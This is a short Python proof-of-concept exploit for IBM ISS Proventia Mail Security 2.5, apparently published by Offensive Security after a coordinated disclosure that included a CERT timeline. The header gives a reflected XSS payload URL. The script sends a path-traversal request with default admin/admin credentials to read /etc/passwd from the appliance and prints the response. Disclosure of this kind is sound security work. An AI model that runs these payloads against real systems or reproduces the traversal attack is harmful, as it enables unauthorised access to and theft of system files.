#!/usr/bin/python

'''

Author: muts of Offensive Security
Product: IBM ISS Proventia Mail Security
Version: 2.5
Vendor Site: http://www.ibm.com/us/en/
Product Page: http://www-935.ibm.com/services/us/en/it-services/proventia-network-mail-security-system.html

Timeline:

04 Jun 2012: Vulnerability reported to CERT
08 Jun 2012: Response received from CERT with disclosure date set to 20 Jul 2012
19 Jul 2012: Reflected XSS Fixed: http://www-01.ibm.com/support/docview.wss?uid=swg21605626
19 Jul 2012: Arbitrary File Read Fixed: http://www-01.ibm.com/support/docview.wss?uid=swg21605630
08 Aug 2012: Public Disclosure

The application is vulnerable to a post-authentication reflected XSS:
https://server/pvm_eventlog_backend/logs_eventDetails.php?recordNumber=42&alertID=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%28123%29%3C/script%3E&MaxEvents=0]]

In addition, there is also a post-authentcation arbitary file-reading vulnerability. The proof of concept code below can be used to replicate the vulnerability.

'''

# IBM Proventia Network Mail Security System POST file read

import urllib
import urllib2
import httplib

username = "admin"
password = "admin"

url = "https://172.16.254.180/javatester_init.php"

password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
password_mgr.add_password(None, "https://172.16.254.180/", username, password)
handler = urllib2.HTTPBasicAuthHandler(password_mgr)
opener = urllib2.build_opener(handler)
data = urllib.urlencode({'template' : '../../../../../etc/passwd','async' : '3','access' : 'direct'})
req = urllib2.Request(url, data)
f = opener.open(req)
print f.read()